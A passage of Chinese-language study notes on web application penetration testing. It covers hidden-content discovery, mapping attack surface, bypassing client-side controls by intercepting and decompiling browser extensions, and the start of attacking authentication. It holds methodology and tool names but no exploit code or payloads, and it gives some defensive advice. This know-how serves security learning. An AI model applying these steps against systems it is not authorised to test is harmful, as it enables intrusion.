<h4 id="蛮力技巧"><a href="#蛮力技巧" class="headerlink" title="蛮力技巧"></a>蛮力技巧</h4><p>通过发送大量的请求，包含常见的目录名称，收集服务器的响应，来猜测隐藏功能的名称和标识符；</p>
<h5 id="渗透测试步骤-1"><a href="#渗透测试步骤-1" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h5><ul>
<li>手动提出一些访问有效与无效资源的请求，看服务器如何处理无效资源；</li>
<li>使用指导抓取生成的站点地图作为自动查找隐藏内容的基础；</li>
<li>针对基础应用程序内已知存在的每个目录或路径中常用的文件名和目录，自动发起请求；如果已经了解应用程序处理访问无效资源的处理方式，则可以配置 Intruder 等工具将其忽略；</li>
<li>收集从服务器返回的响应，手动检查这些响应以筛选出有效的资源；</li>
<li>反复执行这个过程，直到发现新内容；</li>
</ul>
<h4 id="通过公布的内容进行推测"><a href="#通过公布的内容进行推测" class="headerlink" title="通过公布的内容进行推测"></a>通过公布的内容进行推测</h4><p>一般来说，应用程序会使用某种命名方案，因此可以配置抓取工具按照命名方案进行搜索，这样可以提高命中的效率；</p>
<h5 id="渗透测试步骤-2"><a href="#渗透测试步骤-2" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h5><ul>
<li>检查用户指定的浏览与基本蛮力测试获得的结果，包括所有子目录名称、文件词干、文件扩展名列表等；</li>
<li>检查这些列表，确定应用程序所使用的命名方案；</li>
<li>有时候，命名方案中会使用数字和日期作为标识符，因此根据历史文件的命名，可以猜测出公司的新文件的命名；</li>
<li>检查所有客户端代码，如HTML 和 Javascript，寻找与隐藏内容有关的蛛丝马迹，例如代码中的注释部分，经常放着一些重要的线索，有时候甚至有高度敏感的信息；</li>
<li>把已经枚举出来的内容和文件名扩展名添加的常用列表中，它们有可能会揭示应用程序所使用的开发语言和工具；</li>
<li>搜索开发者工具和文件编辑器不经意建立的临时文件，例如 .DS_Store 文件；</li>
<li>结合目录、文件词干、文件扩展名列表，再进一步执行自动搜索操作，发掘更多隐藏的信息；</li>
<li>如果找到了一种统一的命名方案，则可以在这个基础上，实施更有针对性的蛮力测试；</li>
<li>基于新找到内容和新发现的模式，作为用户指导抓取操作的基础，反复执行之前的步骤，继续执行自动内容查找；</li>
</ul>
<blockquote>
<p>上述的大部分动作可以在 Burp Intruder Pro 的内容查找功能中实现；</p>
</blockquote>
<h4 id="利用公共信息"><a href="#利用公共信息" class="headerlink" title="利用公共信息"></a>利用公共信息</h4><p>如果应用程序中的内容在历史上曾经跟其他内容有所连接的话，则可以通过搜索引擎、Web档案等第三方工具将这些连接找出来；</p>
<h5 id="渗透测试步骤-3"><a href="#渗透测试步骤-3" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h5><ul>
<li>使用多种不同的搜索引擎和Web档案工具，查找它们保存的关于所要攻击的应用程序的相关信息；</li>
<li>查询搜索引擎时，可以使用搜索引擎提供的一些便利功能来提高搜索效率，例如：site, link, related 等关键字；</li>
<li>每次搜索时，不仅查看搜索引擎提供的默认部分中的内容，还可以看一下群组、新闻等部分的内容；</li>
<li>如果有部分内容被搜索引擎省略，可以将它们纳入搜索范围后，重新搜索；</li>
<li>查看感兴趣页面的缓存版本，里面可能包含一些未经过验证就无法查看的信息；</li>
<li>在属于相同组织的其他域名上执行相同的查询；</li>
</ul>
<p>一般来说，应用程序的开发人员，在开发过程中不可避免会遇到问题，并到一些论坛上面提问题和寻找答案，因此这些地方有可能会查到一些关于代码的信息；</p>
<h5 id="渗透测试步骤-4"><a href="#渗透测试步骤-4" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h5><ul>
<li>列出与待攻击应用程序相关的开发人员的姓名和邮件列表；</li>
<li>根据姓名查找他们在因特网上发表的所有问题和安全，分析发现的信息，了解与应用程序相关的线索；</li>
</ul>
<h4 id="利用-Web-服务器程序"><a href="#利用-Web-服务器程序" class="headerlink" title="利用 Web 服务器程序"></a>利用 Web 服务器程序</h4><p>Web 服务器程序本身也是存在大量漏洞的，利用这些漏洞可以获得应用程序所有页面和其他资源；更有意思的是， Web 服务器程序一般会结合很多第三方工具来提供一些便捷的功能，这些模块都会有一些安装规律，因为可以加以利用，暴露出一些其他办法查找不到资源路径；</p>
<blockquote>
<p>Nikto 或者 Wikto 即是可以执行上述扫描功能的免费工具；</p>
</blockquote>
<h3 id="应用程序页面与功能路径"><a href="#应用程序页面与功能路径" class="headerlink" title="应用程序页面与功能路径"></a>应用程序页面与功能路径</h3><p>基于 URL 的内容查找源于历史上的静态页面，现在很多服务端应用程序已经演变为以提供动态页面为主，经常在会参数中携带功能的名称，而不是在 URL 中显示，因此前面描述的那些方法不一定能够很好的发现所有的隐藏内容；</p>
<p>针对这种情况，渗透测试的步骤如下：</p>
<ul>
<li>确定所有通过在参数中提交功能名称的情况</li>
<li>修改之前提到的 URL 内容查找自动化的配置，以便让它能够应对这种新的情况；</li>
<li>如果可能的话，根据功能路径画一张应用程序的内容图，找出被枚举的功能和逻辑路径之间的依赖关系；</li>
</ul>
<h3 id="发现隐藏的参数"><a href="#发现隐藏的参数" class="headerlink" title="发现隐藏的参数"></a>发现隐藏的参数</h3><p>有时候开发人员会通过一些隐藏的参数来改变应用程序的行为，例如使用 debug 参数来开启或关闭调试功能；</p>
<p>渗透测试步骤：</p>
<ul>
<li>使用常见参数和常用值，提交大量请求；</li>
<li>监控收到的全部响应，看增加的额外参数有没有让应用程序作出不一样的响应行为；</li>
<li>如果时间允许，可以对所有页面都执行以上动作；如果时间不允许，可以只测试一些重点的页面，例如登录、搜索、文件的上传和下载等；</li>
</ul>
<h2 id="分析应用程序"><a href="#分析应用程序" class="headerlink" title="分析应用程序"></a>分析应用程序</h2><p>在枚举完尽可能多的功能后，接下来是基于收集到的数据，进一步分析应用程序，以找到它的攻击面；值得分析的一些重要部分如下：</p>
<ul>
<li>应用程序的核心功能；</li>
<li>应用程序的外围功能，例如错误消息、日志、重定向使用、站外链接等；</li>
<li>核心安全机制及其动作方式，特别是会话状态、访问控制、验证机制及其支持（例如用户注册、忘记密码、账户恢复等）；</li>
<li>应用程序处理用户提交的输入的所有位置，例如 URL、查询字符串、POST 数据等；</li>
<li>客户端使用的技术，例如表单、客户端脚本、厚客户端组件等；</li>
<li>服务端使用的技术，例如静态与动态页面、请求参数类型、SSL、Web服务器软件、数据库交互、电子邮件系统等后端组件；</li>
<li>其他任何可收集到的，关于服务器应用程序内部结构与功能的其他信息，例如后台传输机制等；</li>
</ul>
<h3 id="确定用户输入的入口点"><a href="#确定用户输入的入口点" class="headerlink" title="确定用户输入的入口点"></a>确定用户输入的入口点</h3><p>输入的常见位置如下：</p>
<ul>
<li>每个 URL 字符串，例如：REST 风格的应用程序；</li>
<li>URL 查询字符串中提交的每个参数；</li>
<li>POST 请求主体中提交的每个参数；</li>
<li>每个 cookie 的键值对；</li>
<li>极少数情况下还包括消息头中的一些字段，例如  User-Agent、Referer、Accept、Accept-Language、Host等；</li>
</ul>
<h4 id="URL-文件路径"><a href="#URL-文件路径" class="headerlink" title="URL 文件路径"></a>URL 文件路径</h4><p>此时的输入体现在 REST 风格的路径中，至于命名是否有统一的标准，主要取决于开发者；</p>
<h4 id="请求参数"><a href="#请求参数" class="headerlink" title="请求参数"></a>请求参数</h4><p>一般来说，在查询字符串的请求参数、POST 参数和 cookie 键值对中，都含有明显的输入，但是它们的格式不一定是标准的 key&#x3D;value 格式，有些开发者会使用一些定制的模式，需要加以留意一下；</p>
<h4 id="HTTP-消息头-1"><a href="#HTTP-消息头-1" class="headerlink" title="HTTP 消息头"></a>HTTP 消息头</h4><p>很多应用程序会使用日志的功能，会去读取 Referer 和 User-Agent 字段里面的值，因此这些消息头也有可能成为入口点；</p>
<p>有些应用程序还会处理消息头里面的值，记录和提取关于用户的一些信息，然后做出不同的响应；例如根据用户访问使用的不同设备、根据 IP 进行定位等；</p>
<p>应用程序的这些功能都增加了 SQL 注入或持续的跨站点脚本等攻击；</p>
<h4 id="带外通道"><a href="#带外通道" class="headerlink" title="带外通道"></a>带外通道</h4><p>在探测的过程中，服务端的结果有时并一定会通过响应进行返回，此时就需要有额外的通道能够查询到这些响应；</p>
<h3 id="确定服务器端技术"><a href="#确定服务器端技术" class="headerlink" title="确定服务器端技术"></a>确定服务器端技术</h3><h4 id="提取版本信息"><a href="#提取版本信息" class="headerlink" title="提取版本信息"></a>提取版本信息</h4><p>例如响应中的 Server 消息头；其他可能揭露服务相关软件信息的有</p>
<ul>
<li>建立 HTML 页面的模板；</li>
<li>定制的 HTTP 消息头；</li>
<li>URL 查询字符串参数；</li>
</ul>
<h4 id="HTTP-指纹识别"><a href="#HTTP-指纹识别" class="headerlink" title="HTTP 指纹识别"></a>HTTP 指纹识别</h4><p>虽然服务端可能会在 Server 消息头中对自己的身份进行伪造，但是应用程序中仍然会有很多蛛丝马迹可以用来推测服务端会使用的软件，也有相应的工具，例如 httprecon 等；</p>
<h4 id="文件扩展名"><a href="#文件扩展名" class="headerlink" title="文件扩展名"></a>文件扩展名</h4><p>常用的文件扩展名</p>
<ul>
<li>asp: Microsoft Active Server Pages;</li>
<li>aspx: ASP.NET</li>
<li>jsp: Java</li>
<li>php: PHP</li>
</ul>
<p>即使页面没有体现出扩展名，也可以通过请求一个不存在的文件，从返回的错误页面也可能可以得到相关信息；</p>
<h4 id="目录名称"><a href="#目录名称" class="headerlink" title="目录名称"></a>目录名称</h4><p>一些子目录名称也可用来确认是否使用相关技术；</p>
<ul>
<li>servlet：Java servlet；</li>
<li>pls: Oracle PL&#x2F;SQL 网关</li>
<li>rails: Ruby on Rails</li>
</ul>
<h4 id="会话令牌"><a href="#会话令牌" class="headerlink" title="会话令牌"></a>会话令牌</h4><p>会话令牌的名称也会揭示信息</p>
<ul>
<li>JESSIONID: Java</li>
<li>ASPSESSIONID: Microsoft IIS 服务器</li>
<li>ASP.NET_SessionId： ASP.NET</li>
<li>PHPSESSID: PHP</li>
</ul>
<h4 id="第三方代码组件"><a href="#第三方代码组件" class="headerlink" title="第三方代码组件"></a>第三方代码组件</h4><p>很多应用程序会整合一些第三方代码组件来执行一些常见的功能，例如购物车、登录机制等；这些组件可能为开源代码，或者从其他公司购买来的，不管是哪一种，都意味着这些组件会被很多人使用；</p>
<p>因此，软件中很可能包含其他地方已经揭示的某些已知漏洞，攻击者还可以下载这些组件的开源代码进行分析，在找到可能的漏洞；</p>
<h5 id="渗透测试步骤-5"><a href="#渗透测试步骤-5" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h5><ul>
<li>确定全部用户输入入口点；</li>
<li>分析应用程序所使用的查询字符串格式，设法了解键值对的名称规律；</li>
<li>确定应用程序可能使用的一些第三方数据的带外通道；</li>
<li>查看响应中的 Server 属性；</li>
<li>检查所有 HTTP 消息头或 HTML 注释中包含的其他软件标识；</li>
<li>运行 Httprecon 工具来识别服务器；</li>
<li>如果获得了 Web 服务器软件名称和版本，则可以搜索可供利用的所有漏洞；</li>
<li>分析应用程序的 URL 列表，从扩展名和子目录名中查找线索；</li>
<li>分析会话令牌的名称；</li>
<li>使用常用技术列表或 Google 推测服务器所使用的技术；</li>
<li>在 Google 上搜索第三方组件可能使用的不常用的 cookie、脚本、HTTP 消息头名称；确定所使用的是哪种第三方组件，下载安装组件，分析其中可能存在的漏洞；</li>
</ul>
<h3 id="确定服务器端功能"><a href="#确定服务器端功能" class="headerlink" title="确定服务器端功能"></a>确定服务器端功能</h3><h4 id="仔细分析请求"><a href="#仔细分析请求" class="headerlink" title="仔细分析请求"></a>仔细分析请求</h4><p>请求中的各种参数暗含着很多信息量，包括资源的类型、可执行的操作、资源的编号、是否使用数据库、服务器的语言框架等；</p>
<h4 id="推测应用程序的行为"><a href="#推测应用程序的行为" class="headerlink" title="推测应用程序的行为"></a>推测应用程序的行为</h4><p>应用程序可能会执行某种输入确认检查，以净化可能存在的恶意输入；如果它有将错误揭示反馈到浏览器，则可以用来判断应该提交哪些输入，才有可能通过检查，之后设计特定字符串来规避检查；</p>
<h4 id="隔离独特的应用程序行为"><a href="#隔离独特的应用程序行为" class="headerlink" title="隔离独特的应用程序行为"></a>隔离独特的应用程序行为</h4><p>有时，许多可靠的应用程序会使用一致的框架来防范各种类型的攻击，此时薄弱点经常出现在开发人员后续添加的而常规安全框架没有处理的那些功能；一般来说，通过 GUI 外观、参数命名约定，或者源代码中的注释，即可找出这些拼接的功能；</p>
<h5 id="渗透测试步骤-6"><a href="#渗透测试步骤-6" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h5><ul>
<li>记录其使用的标准 GUI 外观、参数命名或导航机制与应用程序的其他部分不同的任何功能；</li>
<li>记录可能在后续添加的功能，包括调试功能、CAPTCHA 控件、使用情况跟踪和第三方代码等；</li>
<li>对这些区域进行全面检查，这些区域很可能没有其他区域实施的标准防御机制；</li>
</ul>
<h4 id="解析受攻击面"><a href="#解析受攻击面" class="headerlink" title="解析受攻击面"></a>解析受攻击面</h4><p>常用的易受攻击的漏洞：</p>
<ul>
<li>客户端确认：服务器没有采用确认检查；</li>
<li>数据库交互：SQL 注入；</li>
<li>文件上传与下载：路径遍历漏洞、保存型跨站点脚本；</li>
<li>显示用户提交的数据：跨站点脚本；</li>
<li>动态重定向：重定向与消息头注入攻击；</li>
<li>社交网络功能：用户名枚举、保存型跨站点脚本；</li>
<li>登录：用户名枚举、脆弱密码、可使用蛮力；</li>
<li>多阶段登录：登录缺陷；</li>
<li>会话状态：可推测出的令牌、令牌处理不安全；</li>
<li>访问控制：水平权限和垂直权限提升；</li>
<li>用户伪装功能：权限提升；</li>
<li>使用明文通信：会话劫持、收集证书和其他敏感数据；</li>
<li>站外链接：Referer 消息头中查询字符串参数泄露；</li>
<li>外部系统接口：处理会话与访问控制的快捷方式；</li>
<li>错误消息：令牌泄露；</li>
<li>电子邮件交互：电子邮件与命令注入；</li>
<li>本地代码组件或交互：缓冲区溢出；</li>
<li>使用第三方应用程序组件：已知漏洞；</li>
<li>已确认的Web 服务器软件：常见配置薄弱环节、已知软件程序缺陷；</li>
</ul>
<h4 id="解析-EIS-应用程序"><a href="#解析-EIS-应用程序" class="headerlink" title="解析 EIS 应用程序"></a>解析 EIS 应用程序</h4><ul>
<li>了解应用程序的核心功能和使用的主要安全机制；</li>
<li>确定通常与常见漏洞有关的应用程序功能和行为特点；</li>
<li>在公共漏洞数据库（如 <a target="_blank" rel="noopener" href="http://www.osvdb.org)中检查任何第三方代码,以确定任何已知问题;/">www.osvdb.org）中检查任何第三方代码，以确定任何已知问题；</a></li>
<li>制订攻击计划，优先考虑最可能包含漏洞的功能，以及最严重的漏洞；</li>
</ul>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>虽然直接发动攻击显得很有吸引力，但在行动之前，先做一番分析的工作，将使得攻击的效率大大提高；一般来说，在采用手动技巧的同时，适当的采用自动化工具，是最有效的攻击手段；</p>
<h1 id="5-避开客户端控件"><a href="#5-避开客户端控件" class="headerlink" title="5. 避开客户端控件"></a>5. 避开客户端控件</h1><h2 id="通过客户端传送数据"><a href="#通过客户端传送数据" class="headerlink" title="通过客户端传送数据"></a>通过客户端传送数据</h2><p>一般来说如果将会话数据放在服务器端，安全性更高一些，但是当在很多台服务器同时部署应用程序时，解决它们之间的数据同步将是一个挑战，因此有时候开发人员会将会话数据前移到客户端，这样确实让事情变得简单了，但是却增加了风险；</p>
<h3 id="隐藏表单字段"><a href="#隐藏表单字段" class="headerlink" title="隐藏表单字段"></a>隐藏表单字段</h3><p>应用程序将部分信息保存在隐藏的表单字段中，之后和用户填写的其他表单字段一起提交；</p>
<h3 id="HTTP-cookie"><a href="#HTTP-cookie" class="headerlink" title="HTTP cookie"></a>HTTP cookie</h3><p>应用程序将信息保存在 cookie 的键值对中，之后在客户端发起请求时，一起发到服务端；</p>
<h3 id="URL-参数"><a href="#URL-参数" class="headerlink" title="URL 参数"></a>URL 参数</h3><p>将参数保存在 URL 中是最容易被用户修改的情况了；</p>
<h3 id="Referer-消息头"><a href="#Referer-消息头" class="headerlink" title="Referer 消息头"></a>Referer 消息头</h3><p>有些开发者使用这个字段来判断某个请求是由哪个 URL 触发的；</p>
<h3 id="模糊数据"><a href="#模糊数据" class="headerlink" title="模糊数据"></a>模糊数据</h3><p>有时候服务端发到客户端的数据并不是明文的，而是经过了一定的模糊化处理，然后等客户端提交回服务端时，再解密去模糊；</p>
<h3 id="ASP-NET-ViewState"><a href="#ASP-NET-ViewState" class="headerlink" title="ASP.NET ViewState"></a>ASP.NET ViewState</h3><p>它是一种通过客户端传送模糊数据的常用机制，使用一些隐藏的字段保存一些序列化后的数据；</p>
<p>但是 ASP.NET 默认会开启对 ViewState 字段的保护，通过加盐进行散列化，用来防止客户端的窜改，但有些应用程序会将保护关掉，这个时候就会产生漏洞了；一个页面开启保护，不代表所有页面都开启，因此需要逐一排查；</p>
<h2 id="收集用户数据：HTML-表单"><a href="#收集用户数据：HTML-表单" class="headerlink" title="收集用户数据：HTML 表单"></a>收集用户数据：HTML 表单</h2><h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><p>这个可以轻意绕过，只能用来限制非专业的用户；可以故意给相关的字段设置一个超过长度的值，然后看服务端是否有所反应，如果能够通过验证，则说明服务器端没有再做一次验证，存在漏洞；</p>
<h3 id="基于脚本的确认"><a href="#基于脚本的确认" class="headerlink" title="基于脚本的确认"></a>基于脚本的确认</h3><p>跟前面的长度限制一样，略；</p>
<h3 id="禁用的元素"><a href="#禁用的元素" class="headerlink" title="禁用的元素"></a>禁用的元素</h3><p>浏览器在提交请求时，并不会包含禁用的元素，因此仅仅观察发出的请求是无法找到这些元素的；但在查看页面源代码或者服务器的响应时，就会发现它们；</p>
<h2 id="收集用户数据：浏览器扩展"><a href="#收集用户数据：浏览器扩展" class="headerlink" title="收集用户数据：浏览器扩展"></a>收集用户数据：浏览器扩展</h2><p>相对于 HTML 表单和 Javascript 脚本，使用浏览器扩展相对更不透明一些，这让开发人员有一种错觉，即扩展更加安全，但其实并非如此，通过检查扩展的漏洞经常可以收获很大；</p>
<h3 id="常见的浏览器扩展技术"><a href="#常见的浏览器扩展技术" class="headerlink" title="常见的浏览器扩展技术"></a>常见的浏览器扩展技术</h3><ul>
<li>Java applet</li>
<li>Flash</li>
<li>Silverlight</li>
</ul>
<p>它们有一些共同点，例如都编译成字节码、在提供沙盒环境的虚拟机中运行、可以使用远程框架，通过序列化来传输复杂的数据结构；</p>
<h3 id="攻击浏览器扩展的方法"><a href="#攻击浏览器扩展的方法" class="headerlink" title="攻击浏览器扩展的方法"></a>攻击浏览器扩展的方法</h3><ul>
<li>拦截并修改浏览器扩展提出的请求及服务器的响应；</li>
<li>直接针对组件实施攻击，并尝试反编译它的字节码，以查看它的源代码；</li>
</ul>
<h3 id="拦截浏览器扩展的流量"><a href="#拦截浏览器扩展的流量" class="headerlink" title="拦截浏览器扩展的流量"></a>拦截浏览器扩展的流量</h3><p>如果扩展是明文传输数据，则简单好办，但有时候并非如此，以下是一些常见的问题：</p>
<h4 id="处理序列化数据"><a href="#处理序列化数据" class="headerlink" title="处理序列化数据"></a>处理序列化数据</h4><p>一般来说，每种浏览器扩展都会有一套序列化的方案，研究这些方案的特点，有针对性的进行解析处理；</p>
<h5 id="Java-序列化"><a href="#Java-序列化" class="headerlink" title="Java 序列化"></a>Java 序列化</h5><p>它会在在 Content-Type 里面体现为 application&#x2F;x-java-serialized-object, Burp Suite 中有一个插件 Dser 可用来查看拦截的序列化 Java 对象；</p>
<h5 id="Flash-序列化"><a href="#Flash-序列化" class="headerlink" title="Flash 序列化"></a>Flash 序列化</h5><p>Content-Type: application&#x2F;x-amf</p>
<h5 id="Silverlight-序列化"><a href="#Silverlight-序列化" class="headerlink" title="Silverlight 序列化"></a>Silverlight 序列化</h5><p>Content-Type: application&#x2F;soap+msbin1</p>
<h4 id="拦截浏览器扩展流量时遇到的障碍"><a href="#拦截浏览器扩展流量时遇到的障碍" class="headerlink" title="拦截浏览器扩展流量时遇到的障碍"></a>拦截浏览器扩展流量时遇到的障碍</h4><h5 id="问题1：扩展没有执行在浏览器中设置的代理"><a href="#问题1：扩展没有执行在浏览器中设置的代理" class="headerlink" title="问题1：扩展没有执行在浏览器中设置的代理"></a>问题1：扩展没有执行在浏览器中设置的代理</h5><p>原因在于客户端组件没有使用浏览器的 API 来发出 HTTP 请求，此时可以通过修改 hosts 文件来达到拦截目的，同时将代理服务器配置为劫持匿名代理，并自动重定向的正确的目标主机；</p>
<h5 id="问题2：扩展可能不接受拦截代理器提供的-SSL-证书"><a href="#问题2：扩展可能不接受拦截代理器提供的-SSL-证书" class="headerlink" title="问题2：扩展可能不接受拦截代理器提供的 SSL 证书"></a>问题2：扩展可能不接受拦截代理器提供的 SSL 证书</h5><p>原因在于组件配置为不接受自签名的证书，或者组件本身的编码要求拒绝不可信的证书，此时可以通过在机器上面安装一个 CA 证书，并将代理服务器配置为使用该证书；</p>
<h5 id="问题3：扩展使用除-HTTP-以外的协议进行通信"><a href="#问题3：扩展使用除-HTTP-以外的协议进行通信" class="headerlink" title="问题3：扩展使用除 HTTP 以外的协议进行通信"></a>问题3：扩展使用除 HTTP 以外的协议进行通信</h5><p>原因在于拦截代理服务器可能无法处理这些协议；使用网络嗅探器例如 Echo Mirage 来修改相关流量，它通过注入进程并拦截套按字 API 调用来实现查看和修改数据的目的；</p>
<h5 id="渗透测试步骤-7"><a href="#渗透测试步骤-7" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h5><ul>
<li>确保代理服务器能够正确拦截浏览器扩展发出的所有流量；如有必要，使用嗅探器确定任何未正确拦截的流量；</li>
<li>如果扩展使用标准的序列化框架，确保拥有解压并修改序列化数据所需的工具；如果扩展使用专用编码或加密机制，则需要调试组件，对其进行全面测试；</li>
<li>检查服务器返回的能够触发客户端关键步骤的响应；一般来说，通过修改这个响应，能够解锁客户端的GUI，从而发现并执行那些复杂或多步骤的操作；</li>
<li>如果一些关键步骤（如赌博应用中的发牌动作）不是由客户端执行，而是由服务端执行，则尝试寻找执行该步骤和服务端通信之间的联系</li>
</ul>
<h4 id="反编译浏览器扩展"><a href="#反编译浏览器扩展" class="headerlink" title="反编译浏览器扩展"></a>反编译浏览器扩展</h4><p>在应对浏览器扩展时，对其进行反编译是最彻底的方法；一般来说，根据各自语言的特性，组件是以字节码的形式存在的，有时还会有反编码的防御机制，尽管如此，仍然是很有可能破解的；</p>
<h5 id="下载字节码"><a href="#下载字节码" class="headerlink" title="下载字节码"></a>下载字节码</h5><p>一般来说，字节码通过页面源文件中的 <applet> 或 <object> 标签进行加载，里面有供下载的 URL；有时是通过脚本进行加载，此时可以等页面加载完毕后，再查看代理服务器的历史记录中的 URL；</p>
<blockquote>
<p>由于字节码在加载后会被缓存，因为有时需要通过清理缓存来触发再次加载；另外拦截器有时会隐藏一些它认为不重要的信息，此时需要全部显示出来才找得到；</p>
</blockquote>
<h5 id="反编译字节码"><a href="#反编译字节码" class="headerlink" title="反编译字节码"></a>反编译字节码</h5><p>字节码经常以压缩包的形式被下载，因此需要先进行解压缩；Java 的 jar 包，Silverlight 的 .xap 文件，都是使用 zip 格式压缩的，此时只需给文件增加 zip 的后缀，即可以使用 zip 软件进行解压缩；</p>
<p>常用的反编译工具</p>
<ul>
<li>Java：Jad</li>
<li>Flash：Flasm，Flare，SWFScan；</li>
<li>Silverlight：NET Reflector；</li>
</ul>
<h5 id="分析源代码"><a href="#分析源代码" class="headerlink" title="分析源代码"></a>分析源代码</h5><h6 id="重点分析的事项："><a href="#重点分析的事项：" class="headerlink" title="重点分析的事项："></a>重点分析的事项：</h6><ul>
<li>客户端输入确认或其他与安全相关的逻辑和事件；</li>
<li>在提交数据到服务端前，对数据进行加密或者模糊的函数；</li>
<li>在用户界面中看不到，但可以使用的隐藏功能；</li>
<li>在解析服务端时没发现，但在组件中引用的服务端功能；</li>
</ul>
<h6 id="修改组件行为的方法"><a href="#修改组件行为的方法" class="headerlink" title="修改组件行为的方法"></a>修改组件行为的方法</h6><ul>
<li>修改源代码后，重新编译为字节码，清理缓存，重新下载字节码，之后用拦截器进行替换；</li>
<li>修改源代码后，重新编译为字节码，使用它计算出结果，导出到本地，用代理服务器将该结果提交到服务器；</li>
</ul>
<h6 id="使用-Javascript-操纵原始组件"><a href="#使用-Javascript-操纵原始组件" class="headerlink" title="使用 Javascript 操纵原始组件"></a>使用 Javascript 操纵原始组件</h6><p>有时并不需要修改组件的字节码，而是基于组件的方法可能会被 javascript 调用，然后返回处理结果；此时，只需要修改 javascript 就可以实现修改结果的目的；</p>
<blockquote>
<h5 id="渗透测试步骤-8"><a href="#渗透测试步骤-8" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h5><ul>
<li>下载、解压字节码，反编译成源代码；</li>
<li>查看源代码，了解组件的工作过程；</li>
<li>如果组件包含公共的方法，拦截与该组件交互的 HTML 响应，添加或修改 Javacript，获取想要的结果；</li>
<li>如果组件不包含公共的方法，修改组件的源代码，重新编译为字节码，独立执行这些字节码，获取想要的结果；</li>
<li>如果组件负责向服务端提交模糊或加密的数据，则可以设计一些特定的字符串，通过组件提交，用来探查服务端可能存在的漏洞；</li>
</ul>
</blockquote>
<h5 id="字节码模糊处理"><a href="#字节码模糊处理" class="headerlink" title="字节码模糊处理"></a>字节码模糊处理</h5><p>为了应对反编译，人们会使用一些模糊技巧，让反编译后的结果难以被理解，或者增加理解的难度；常用的反编译技巧如下：</p>
<ul>
<li>用没有意义的表达式替代有意义的类、方法、成员变量名称；</li>
<li>用保留的关键字替换项目名称；</li>
<li>删除字节码中不必要的调试和元信息，例如源文件名、行号、局部变量名、内部类信息；</li>
<li>增加多余的代码；</li>
<li>使用跳转指令对整个代码的执行路径进行修改，令人难以理解和判断执行代码的逻辑顺序；</li>
<li>在字节码中引入非法代码，如果不清除这些非法代码，则无法重新编译；</li>
</ul>
<blockquote>
<h5 id="渗透测试步骤-9"><a href="#渗透测试步骤-9" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h5><ul>
<li>不必完全理解源代码，只需确定是否包含公共方法，以及哪些方法可以从 javascript 进行调用，它们的签名是什么；</li>
<li>如果使用了无意义的表达式，则可以使用 IDE 内置的重构功能（如 rename），为其分配有意义的名称；</li>
<li>对已经模糊处理过的字节码，使用模糊处理工具，再次对其进行模糊处理，这样可以撤销许多模糊处理，例如 Jode 工具，它可用来删除由其他模糊处理工具添加的多余代码，并为数据分配唯一的名称，为理解模糊后的结果提供线索；</li>
</ul>
</blockquote>
<h4 id="附加调试器"><a href="#附加调试器" class="headerlink" title="附加调试器"></a>附加调试器</h4><p>有时组件很大，代码很多行，阅读它们很费时间，此时可考虑使用另外一种方法，即调试器；由于组件是在字节码级别运行的，因此用调试器在运行过程中跟踪变量，加入断点，查看和修改参数或变量，获取想要的结果，例如 javaSnoop；</p>
<h4 id="本地客户端组件"><a href="#本地客户端组件" class="headerlink" title="本地客户端组件"></a>本地客户端组件</h4><p>本地客户端组件不是基于字节码来运行，而是基于机器语言和汇编，因此它们的反编译工作稍微复杂一些（即逆向工程领域），不过原理仍然是一样的，即使用调试工具和添加断点，来分析程序的行为规律；</p>
<p>常用工具有：OllyDbg，IDA Pro等；</p>
<h2 id="安全处理客户端数据"><a href="#安全处理客户端数据" class="headerlink" title="安全处理客户端数据"></a>安全处理客户端数据</h2><h3 id="通过客户端传送数据-1"><a href="#通过客户端传送数据-1" class="headerlink" title="通过客户端传送数据"></a>通过客户端传送数据</h3><p>理论上，所有的数据服务端都是有的，因此，应该尽可能避免将敏感数据交给客户端提交，因为客户端是不可控的；</p>
<p>如果实在迫不得已，则应该将敏感数据和其他数据进行组合，然后加密，再发送到客户端，而不能仅单独加密敏感数据；</p>
<h3 id="确认客户端生成的数据"><a href="#确认客户端生成的数据" class="headerlink" title="确认客户端生成的数据"></a>确认客户端生成的数据</h3><p>由于客户端被用户完全控制，因此在客户端对数据进行确认在理论上是几乎不可能的，只是难度大小的区别而已；</p>
<p>唯一安全的方法是永远不信任客户端，对客户端提交的每一项数据，都进行确认和验证；</p>
<h3 id="日志与警报"><a href="#日志与警报" class="headerlink" title="日志与警报"></a>日志与警报</h3><p>服务端有必要增加警报机制，在收到非法数据后，记录到日志中，向应用程序管理员发出警报，以便其能够监控攻击企图；同时应用程序还应该主动采取防御措施，终止用户会话或者暂时冻结其账户；</p>
<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>永远不要相信客户端的输入；</p>
<h1 id="6-攻击验证机制"><a href="#6-攻击验证机制" class="headerlink" title="6. 攻击验证机制"></a>6. 攻击验证机制</h1><h2 id="验证技术"><a href="#验证技术" class="headerlink" title="验证技术"></a>验证技术</h2><p>常用的验证技术</p>
<ul>
<li>基于 HTML 表单的验证</li>
<li>多元机制，如密码+物理令牌；</li>
<li>客户端 SSL 证书或智能卡；</li>
<li>HTTP 基本和摘要验证；</li>
<li>使用 NTLM 或 Kerberos 整合 Windows 验证；</li>
<li>第三方验证服务</li>
</ul>
<h2 id="验证机制设计缺陷"><a href="#验证机制设计缺陷" class="headerlink" title="验证机制设计缺陷"></a>验证机制设计缺陷</h2><h3 id="密码保密性不强"><a href="#密码保密性不强" class="headerlink" title="密码保密性不强"></a>密码保密性不强</h3><p>主要源于没有控制密码的强度；例如：</p>
<ul>
<li>非常短或空白的密码；</li>
<li>以常用的字典词汇或名称为密码；</li>
<li>密码和用户名完全相同；</li>
<li>仍然使用默认密码；</li>
</ul>
<h4 id="渗透测试步骤-10"><a href="#渗透测试步骤-10" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>设法查明任何与密码强度有关的规则</li>
<li>浏览站点，查找规则的描述；</li>
